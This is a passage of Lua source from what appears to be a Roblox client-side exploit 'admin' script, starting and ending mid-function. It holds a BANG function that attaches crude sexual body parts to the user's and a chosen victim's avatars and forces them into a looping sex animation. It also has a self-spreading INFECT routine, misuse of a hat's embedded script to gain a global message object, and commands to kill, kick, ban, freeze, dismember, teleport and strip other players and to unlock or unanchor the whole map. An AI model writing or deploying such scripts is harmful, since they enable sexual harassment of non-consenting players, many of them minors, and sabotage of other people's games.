		M1.MaxVelocity = math.min((T.Velocity.magnitude / 10), 0.04) + MV
		M1.DesiredAngle = -ANG
		if M1.CurrentAngle < -0.05 and M1.DesiredAngle > -.05 then
			M1.MaxVelocity = 0.04
		end
		repeat
			wait()
		until M1.CurrentAngle == M1.DesiredAngle or math.abs(T.Velocity.magnitude - oldMag)  >= (T.Velocity.magnitude / 10) + 1
		if T.Velocity.magnitude < 0.1 then
			wait(0.1)
		end
	until not C or C.Parent ~= T.Parent
end

function INFECT(PLAYER)
	for i,v in pairs(PLAYER.Character:GetChildren()) do
		Instance.new('Folder', PLAYER.Character).Name = 'infected_seth'
		if v:IsA('Accessory') or v:IsA('Shirt') or v:IsA('Pants') then
			v:destroy()
		elseif v:IsA('ShirtGraphic') then
			v.Archivable = false
			v.Graphic = ''
		end
	end
	
	if PLAYER.Character.Head:FindFirstChild('face') then
		PLAYER.Character.Head.face.Texture = 'rbxassetid://7074882'
	end
	
	for i,v in pairs (PLAYER.Character:GetChildren()) do
		if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
			if v.Name == 'Head' or v.Name == 'Left Arm' or v.Name == 'Right Arm' then
				v.BrickColor = BrickColor.new('Medium green')
			elseif v.Name == 'Torso' or v.Name == 'Left Leg' or v.Name == 'Right Leg' then
				v.BrickColor = BrickColor.new('Brown')
			end
		end
	end
	
	local T = PLAYER.Character.Torso.Touched:connect(function(TC)
		if not TC.Parent:FindFirstChild('infected_seth') then
			local GPFC = _PLAYERS:GetPlayerFromCharacter(TC.Parent)
			if GPFC then
				INFECT(GPFC)
			end
		end
	end)
end

function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
	local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
	if (zCoco) then
		funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
	else
		funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
	end
	return funcw
end

function BANG(VICTIM)
	spawn(function()
		local P1 = _PLAYERS.LocalPlayer.Character.Torso
		local V1 = _PLAYERS[VICTIM].Character.Torso
		
		V1.Parent.Humanoid.PlatformStand = true
		
		P1['Left Shoulder']:destroy() local LA1 = Instance.new('Weld', P1) LA1.Part0 = P1 LA1.Part1 = P1.Parent['Left Arm'] LA1.C0 = CFrame.new(-1.5, 0, 0) LA1.Name = 'Left Shoulder'
		
		P1['Right Shoulder']:destroy() local RS1 = Instance.new('Weld', P1) RS1.Part0 = P1 RS1.Part1 = P1.Parent['Right Arm'] RS1.C0 = CFrame.new(1.5, 0, 0) RS1.Name = 'Right Shoulder'
		
		V1['Left Shoulder']:destroy() local LS2 = Instance.new('Weld', V1) LS2.Part0 = V1 LS2.Part1 = V1.Parent['Left Arm'] LS2.C0 = CFrame.new(-1.5, 0, 0) LS2.Name = 'Left Shoulder'
		
		V1['Right Shoulder']:destroy() local RS2 = Instance.new('Weld', V1) RS2.Part0 = V1 RS2.Part1 = V1.Parent['Right Arm'] RS2.C0 = CFrame.new(1.5, 0, 0) RS2.Name = 'Right Shoulder'
		
		V1['Left Hip']:destroy() local LH2 = Instance.new('Weld', V1) LH2.Part0 = V1 LH2.Part1 = V1.Parent['Left Leg'] LH2.C0 = CFrame.new(-0.5, -2, 0) LH2.Name = 'Left Hip'
		
		V1['Right Hip']:destroy() local RH2 = Instance.new('Weld', V1) RH2.Part0 = V1 RH2.Part1 = V1.Parent['Right Leg'] RH2.C0 = CFrame.new(0.5, -2, 0) RH2.Name = 'Right Hip'
		
		local D = Instance.new('Part', P1) D.TopSurface = 0 D.BottomSurface = 0 D.CanCollide = false D.BrickColor = BrickColor.new('Pastel brown') D.Shape = 'Ball' D.Size = Vector3.new(1, 1, 1)
		
		local DM1 = Instance.new('SpecialMesh', D) DM1.MeshType = 'Sphere' DM1.Scale = Vector3.new(0.4, 0.4, 0.4)
		
		fWeld('weld', P1, P1, D, true, -0.2, -1.3, -0.6, 0, 0, 0)
		
		local D2 = D:Clone() D2.Parent = P1
		
		fWeld('weld', P1, P1, D2, true, 0.2, -1.3, -0.6, 0, 0, 0)
		
		local C = Instance.new('Part', P1) C.TopSurface = 0 C.BottomSurface = 0 C.CanCollide = false C.BrickColor = BrickColor.new('Pastel brown') C.Size = Vector3.new(0.4, 1.3, 0.4)
		
		fWeld('weld', P1, P1, C, true, 0, -1, -0.52 + (-C.Size.y / 2), math.rad(-80), 0, 0)
		
		local C2 = D:Clone() C2.BrickColor = BrickColor.new('Pink') C2.Mesh.Scale = Vector3.new(0.4, 0.62, 0.4) C2.Parent = P1
		
		fWeld('weld', C, C, C2, true, 0, 0 + (C.Size.y / 2), 0, math.rad(-10), 0, 0)
		
		local CM = Instance.new('CylinderMesh', C)
		
		local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.BrickColor = BrickColor.new('Pastel brown') BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
		
		local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
		
		fWeld('weld', V1, V1, BL, true, -0.5, 0.5, -0.6, 0, 0, 0)
		
		local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.BrickColor = BrickColor.new('Pastel brown') BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
		
		local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
		
		fWeld('weld', V1, V1, BR, true, 0.5, 0.5, -0.6, 0, 0, 0)
		
		local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
		
		local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
		
		fWeld('weld', V1, V1, BLN, true, -0.5, 0.5, -1.2, 0, 0, 0)
		
		local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
		
		local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
		
		fWeld('weld', V1, V1, BRN, true, 0.5, 0.5, -1.2, 0, 0, 0)
		
		LH2.C1 = CFrame.new(0.2, 1.6, 0.4) * CFrame.Angles(3.9, -0.4, 0) RH2.C1 = CFrame.new(-0.2, 1.6, 0.4) * CFrame.Angles(3.9, 0.4, 0)
		LS2.C1 = CFrame.new(-0.2, 0.9, 0.6) * CFrame.Angles(3.9, -0.2, 0) RS2.C1 = CFrame.new(0.2, 0.9, 0.6) * CFrame.Angles(3.9, 0.2, 0)
		LA1.C1 = CFrame.new(-0.5, 0.7, 0) * CFrame.Angles(-0.9, -0.4, 0) RS1.C1 = CFrame.new(0.5, 0.7, 0) * CFrame.Angles(-0.9, 0.4, 0)
		
		if P1:FindFirstChild('weldx') then P1.weldx:destroy() end
		
		WE = fWeld('weldx', P1, P1, V1, true, 0, -0.9, -1.3, math.rad(-90), 0, 0)
		
		local N = V1.Neck N.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)
	end)
	spawn(function() while wait() do for i = 1, 6 do WE.C1 = WE.C1 * CFrame.new(0, -0.3, 0) end for i = 1, 6 do WE.C1 = WE.C1 * CFrame.new(0, 0.3, 0) end end end)
end

function RESPAWN(PLAYER)
	local M = Instance.new('Model', workspace) M.Name = 'respawn_seth'
	local T = Instance.new('Part', M) T.Name = 'Torso' T.CanCollide = false T.Transparency = 1
	Instance.new('Humanoid', M)
	PLAYER.Character = M
end

function LOAD_MESSAGE(STRING)
	_PLAYERS.LocalPlayer.CharacterAppearanceId = 20018
	RESPAWN(LP)
	
	R = false
	LP.CharacterAdded:connect(function()
		if not R then
			wait(0.5)
			if LP.Character:FindFirstChild('Humanoid') then
				MAIN_HAT = LP.Character:FindFirstChild('BunnyEarsOfCaprice'):Clone()
			end
			R = true
		end
	end)
	repeat wait() until R
	RESPAWN(LP)
	LP.CharacterAppearanceId = 0
	
	if MAIN_HAT then
		MAIN_HAT.Handle.CanCollide = true
		local M = MAIN_HAT.Handle.BunnyTools.EggScript3:Clone()
		local P = Instance.new('Part')
		M.Disabled = false
		M.Parent = P
		MAIN_HAT.Handle.BunnyTools.EggMesh3:Clone().Parent = P
		MAIN_HAT:destroy()
		P.Parent = LP.Character
		repeat wait() until LP:FindFirstChild('ChessMsg')
		MG = LP:FindFirstChild('ChessMsg')
		MG.Name = 'message_seth'
		MG.Text = ''
		MG.Parent = workspace
		MESSAGE(STRING)
		P:destroy()
		for i,v in pairs(workspace:GetChildren()) do
			if v:IsA('Part') and v.BrickColor == BrickColor.new('Bright red') and v.Reflectance == 0 and v.Transparency == 0 and not v.Anchored and v.CanCollide and v.Locked and v:FindFirstChild('Decal') and v.Size == Vector3.new(8, 0.4, 8) then
				if v.Decal.Texture == 'http://www.roblox.com/asset/?id=1531000' and v.Transparency == 0 and v.Decal.Face == Enum.NormalId.Top then
					v:destroy()
				end
			end
		end
	end
end

function MESSAGE(STRING)
	if not SHOWING_MESSAGE then
		spawn(function()
			SHOWING_MESSAGE = true
			MG.Text = STRING
			wait(5)
			MG.Text = ''
			SHOWING_MESSAGE = false
		end)
	end
end

_G.CLICK_TP = false
local M_CTRL = false

MOUSE.KeyDown:connect(function(K) if K:byte() == 50 then M_CTRL = true end end)
MOUSE.KeyUp:connect(function(K) if K:byte() == 50 then M_CTRL = false end end)
MOUSE.Button1Down:connect(function() if _G.CLICK_TP and M_CTRL and MOUSE.Target and LP.Character and LP.Character:FindFirstChild('HumanoidRootPart') then LP.Character.HumanoidRootPart.CFrame = CFrame.new(MOUSE.Hit.p) + Vector3.new(0, 3, 0) end end)

_LIGHTING.Outlines = false -- / outlines are gross

if FIND_IN_TABLE(BANS, LP.userId) then LP:Kick() end

for i,v in pairs(_PLAYERS:GetPlayers()) do if FIND_IN_TABLE(BANS, v.userId) then table.insert(KICKS, v) else UPDATE_CHAT(v) end end

-- / commands

ADD_COMMAND('ff','ff [plr]', {},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		Instance.new('ForceField', _PLAYERS[v].Character)
	end
end)

ADD_COMMAND('unff','unff [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(_PLAYERS[v].Character:GetChildren()) do
			if v:IsA('ForceField') then
				v:destroy()
			end
		end
	end
end)

ADD_COMMAND('fire','fire [plr] [r] [g] [b]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(_PLAYERS[v].Character:GetChildren()) do
			if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
				local F = Instance.new('Fire', v)
				if ARGS[2] and ARGS[3] and ARGS[4] then
					F.Color = C3(ARGS[2], ARGS[3], ARGS[4])
					F.SecondaryColor = C3(ARGS[2], ARGS[3], ARGS[4])
				end
			end
		end
	end
end)

ADD_COMMAND('unfire','unfire [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR:GetChildren()) do
			for i,v in pairs(v:GetChildren()) do
				if v:IsA('Fire') then
					v:destroy()
				end
			end
		end
	end
end)

ADD_COMMAND('sp','sp [plr] [r] [g] [b]',{'sparkles'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(_PLAYERS[v].Character:GetChildren()) do
			if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
				if ARGS[2] and ARGS[3] and ARGS[4] then
					Instance.new('Sparkles', v).Color = C3(ARGS[2], ARGS[3], ARGS[4])
				else
					Instance.new('Sparkles', v)
				end
			end
		end
	end
end)

ADD_COMMAND('unsp','unsp [plr]',{'unsparkles'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(_PLAYERS[v].Character:GetChildren()) do
			for i,v in pairs(v:GetChildren()) do
				if v:IsA('Sparkles') then
					v:destroy()
				end
			end
		end
	end
end)

ADD_COMMAND('smoke','smoke [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		Instance.new('Smoke', _PLAYERS[v].Character.Torso)
	end
end)

ADD_COMMAND('unsmoke','unsmoke [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(_PLAYERS[v].Character.Torso:GetChildren()) do
			if v:IsA('Smoke') then
				v:destroy()
			end
		end
	end
end)

ADD_COMMAND('btools','btools [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		Instance.new('HopperBin', _PLAYERS[v].Backpack).BinType = 2
		Instance.new('HopperBin', _PLAYERS[v].Backpack).BinType = 3
		Instance.new('HopperBin', _PLAYERS[v].Backpack).BinType = 4
	end
end)

ADD_COMMAND('god','god [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then
			PCHAR.Humanoid.MaxHealth = math.huge PCHAR.Humanoid.Health = PCHAR.Humanoid.MaxHealth
		end
	end
end)

ADD_COMMAND('sgod','sgod [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then
			PCHAR.Humanoid.MaxHealth = 10000000 PCHAR.Humanoid.Health = PCHAR.Humanoid.MaxHealth
		end
	end
end)

ADD_COMMAND('ungod','ungod [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then 
			PCHAR.Humanoid.MaxHealth = 100 
		end
	end
end)

ADD_COMMAND('heal','heal [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then
			PCHAR.Humanoid.Health = PCHAR.Humanoid.MaxHealth
		end
	end
end)

ADD_COMMAND('freeze','freeze [plr]',{'frz'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(PLAYERS) do
			local PCHAR = _PLAYERS[v].Character
			for i,v in pairs(PCHAR:GetChildren()) do
				if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
					v.Anchored = true
				end
			end
		end
	end
end)

ADD_COMMAND('thaw','thaw [plr]',{'unfreeze','unfrz'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(PLAYERS) do
			for i,v in pairs(_PLAYERS[v].Character:GetChildren()) do
				if v:IsA('Part') then
					v.Anchored = false
				end
			end
		end
	end
end)

ADD_COMMAND('kill','kill [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].Character:BreakJoints()
	end
end)

ADD_COMMAND('sound','sound [id]',{},
function(ARGS, SPEAKER)
	for i,v in pairs(workspace:GetChildren()) do if v:IsA('Sound') then v:Stop() v:destroy() end end
	if ARGS[1]:lower() ~= 'off' then
		local S = Instance.new('Sound', workspace) S.Name = 'song_seth' S.Archivable = false S.Looped = true S.SoundId = 'rbxassetid://' .. ARGS[1] S.Volume = 1 S:Play()
	end
end)

ADD_COMMAND('volume','volume [int]',{},
function(ARGS, SPEAKER)
	for i,v in pairs(workspace:GetChildren()) do if v:IsA('Sound') then v.Volume = ARGS[1] end end
end)

ADD_COMMAND('pitch','pitch [int]',{},
function(ARGS, SPEAKER)
	for i,v in pairs(workspace:GetChildren()) do if v:IsA('Sound') then v.Pitch = ARGS[1] end end
end)

ADD_COMMAND('explode','explode [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Torso') then
			Instance.new('Explosion', PCHAR).Position = PCHAR.Torso.Position					
		end
	end
end)

ADD_COMMAND('invis','invis [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR:GetChildren()) do
			if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
				v.Transparency = 1
			end
			if v:IsA('Accessory') and v:FindFirstChild('Handle') then
				v.Handle.Transparency = 1
			end
		end
		if PCHAR.Head:FindFirstChild('face') then PCHAR.Head.face.Transparency = 1 end
	end
end)

ADD_COMMAND('vis','vis [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR:GetChildren()) do
			if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
				v.Transparency = 0
			end
			if v:IsA('Accessory') and v:FindFirstChild('Handle') then
				v.Handle.Transparency = 0
			end
		end
		if PCHAR.Head:FindFirstChild('face') then PCHAR.Head.face.Transparency = 0 end
	end
end)

ADD_COMMAND('goto','goto [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR then
			SPEAKER.Character.HumanoidRootPart.CFrame = PCHAR.Torso.CFrame
		end
	end
end)

ADD_COMMAND('bring','bring [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].Character.HumanoidRootPart.CFrame = SPEAKER.Character.Torso.CFrame
	end
end)

ADD_COMMAND('tp','tp [plr] [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS1, PLAYERS2 = GET_PLAYER(ARGS[1], SPEAKER), GET_PLAYER(ARGS[2], SPEAKER)
	for i,v in pairs(PLAYERS1) do for a,b in pairs(PLAYERS2) do
		if _PLAYERS[v].Character and _PLAYERS[b].Character then
			_PLAYERS[v].Character.HumanoidRootPart.CFrame = _PLAYERS[b].Character.Torso.CFrame
		end
	end end
end)

ADD_COMMAND('char','char [plr] [id]',{'charapp'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].CharacterAppearanceId = ARGS[2]
		_PLAYERS[v].Character:BreakJoints()
	end
end)

ADD_COMMAND('ws','ws [plr] [int]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then
			PCHAR.Humanoid.WalkSpeed = tonumber(ARGS[2])
		end
	end
end)

ADD_COMMAND('time','time [int]',{},
function(ARGS, SPEAKER)
	_LIGHTING:SetMinutesAfterMidnight(tonumber(ARGS[1]) * 60)
end)

ADD_COMMAND('kick','kick [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		table.insert(KICKS, _PLAYERS[v])
	end
end)

ADD_COMMAND('ban','ban [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		table.insert(BANS, _PLAYERS[v].userId)
		table.insert(KICKS, _PLAYERS[v])
		UPDATE_BANS()
	end
end)

ADD_COMMAND('unban','unban [username]',{},
function(ARGS, SPEAKER)
	if FIND_IN_TABLE(BANS, game.Players:GetUserIdFromNameAsync(ARGS[1])) then
		table.remove(BANS, GET_IN_TABLE(BANS, game.Players:GetUserIdFromNameAsync(ARGS[1])))
		UPDATE_BANS()
	end
end)

ADD_COMMAND('unlockws','unlock',{'unlock'},
function(ARGS, SPEAKER)
	local function UNLOCK(INSTANCE) 
		for i,v in pairs(INSTANCE:GetChildren()) do
			if v:IsA('BasePart') then
				v.Locked = false
			end
			UNLOCK(v)
		end
	end
	UNLOCK(workspace)
end)

ADD_COMMAND('lockws','lock',{'lock'},
function(ARGS, SPEAKER)
	local function LOCK(INSTANCE) 
		for i,v in pairs(INSTANCE:GetChildren()) do
			if v:IsA('BasePart') then
				v.Locked = true
			end
			LOCK(v)
		end
	end
	LOCK(workspace)
end)

ADD_COMMAND('unanchorws','unanchor',{'unanchor'},
function(ARGS, SPEAKER)
   local function UNANCHOR(INSTANCE) 
		for i,v in pairs(INSTANCE:GetChildren()) do
			if v:IsA('BasePart') then
				v.Anchored = false
			end
			UNANCHOR(v)
		end
	end
	UNANCHOR(workspace)
end)

ADD_COMMAND('anchorws','anchor',{'anchor'},
function(ARGS, SPEAKER)
   local function ANCHOR(INSTANCE) 
		for i,v in pairs(INSTANCE:GetChildren()) do
			if v:IsA('BasePart') then
				v.Anchored = true
			end
			ANCHOR(v)
		end
	end
	ANCHOR(workspace)
end)

ADD_COMMAND('hsize','hsize [plr] [int]',{'hatsize'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(_PLAYERS[v].Character:GetChildren()) do
			if v:IsA('Accessory') then
				for a,b in pairs(v.Handle:GetChildren()) do
					if b:IsA('SpecialMesh') then
						b.Scale = ARGS[2] * Vector3.new(1, 1, 1)
					end
				end
			end
		end
	end
end)

ADD_COMMAND('shats','shats [plr]',{'stealhats'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(_PLAYERS[v].Character:GetChildren()) do
			if v:IsA('Accessory') then
				v.Parent = SPEAKER.Character
			end
		end
	end
end)

ADD_COMMAND('rhats','rhats [plr]',{'removehats'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then
			PCHAR.Humanoid:RemoveAccessories()
		end
	end
end)

ADD_COMMAND('firstp','firstp [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].CameraMode = 'LockFirstPerson'
	end
end)

ADD_COMMAND('thirdp','thirdp [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].CameraMode = 'Classic'
	end
end)

ADD_COMMAND('chat','chat [plr] [string]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		game.Chat:Chat(_PLAYERS[v].Character.Head, GLS(false, 1))
	end
end)

ADD_COMMAND('name','name [plr] [string]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].Character.Name = GLS(false, 1)
	end
end)

ADD_COMMAND('unname','unname [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].Character.Name = _PLAYERS[v].Name
	end
end)

ADD_COMMAND('noname','noname [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].Character.Name = ''
	end
end)

ADD_COMMAND('stun','stun [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		PCHAR.Humanoid.PlatformStand = true
	end
end)

ADD_COMMAND('unstun','unstun [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		PCHAR.Humanoid.PlatformStand = false
	end
end)

ADD_COMMAND('guest','guest [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		_PLAYERS[v].CharacterAppearanceId = 1
		PCHAR:BreakJoints()
	end
end)

ADD_COMMAND('noob','noob [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		_PLAYERS[v].CharacterAppearanceId = 155902847
		PCHAR:BreakJoints()
	end
end)

ADD_COMMAND('damage','damage [plr] [int]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].Character.Humanoid:TakeDamage(ARGS[2])
	end
end)

ADD_COMMAND('view','view [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		workspace.CurrentCamera.CameraSubject = PCHAR
	end
end)

ADD_COMMAND('unview','unview',{},
function()
	workspace.CurrentCamera.CameraSubject = _PLAYERS.LocalPlayer.Character
end)

ADD_COMMAND('nolimbs','nolimbs [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR:GetChildren()) do
			local LIMB = PCHAR.Humanoid:GetLimb(v)
			if v:IsA('BasePart') and PCHAR:FindFirstChild('Humanoid') and LIMB ~= Enum.Limb.Unknown and LIMB ~= Enum.Limb.Head and LIMB ~= Enum.Limb.Torso then
				v:destroy()
			end
		end
	end	
end)

ADD_COMMAND('box','box [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		local SB = Instance.new('SelectionBox', PCHAR)
		SB.Adornee = SB.Parent
		SB.Color = BrickColor.new('' .. (ARGS[2]))
	end
end)

ADD_COMMAND('unbox','nobox [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(_PLAYERS[v].Character:GetChildren()) do
			if v:IsA('SelectionBox') then
				v:destroy()
			end
		end
	end
end)

ADD_COMMAND('ghost','ghost [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR:GetChildren()) do
			if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
				v.Transparency = 0.5
			elseif v:IsA('Accessory') and v:FindFirstChild('Handle') then
				v.Handle.Transparency = 0.5
			elseif PCHAR.Head:FindFirstChild('face') then
				PCHAR.Head.face.Transparency = 0.5
			end
		end
	end
end)

ADD_COMMAND('sphere','sphere [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR=_PLAYERS[v].Character
		local SS = Instance.new('SelectionSphere', PCHAR)
		SS.Adornee = SS.Parent
	end
end)

ADD_COMMAND('sky','sky [id]',{},
function(ARGS, SPEAKER)
	if ARGS[1] then
		for i,v in pairs(_LIGHTING:GetChildren()) do if v:IsA('Sky') then v:destroy() end end
		local SKIES = {'Bk', 'Dn', 'Ft', 'Lf', 'Rt', 'Up'}
		local SKY = Instance.new('Sky', _LIGHTING)
		for i,v in pairs(SKIES) do
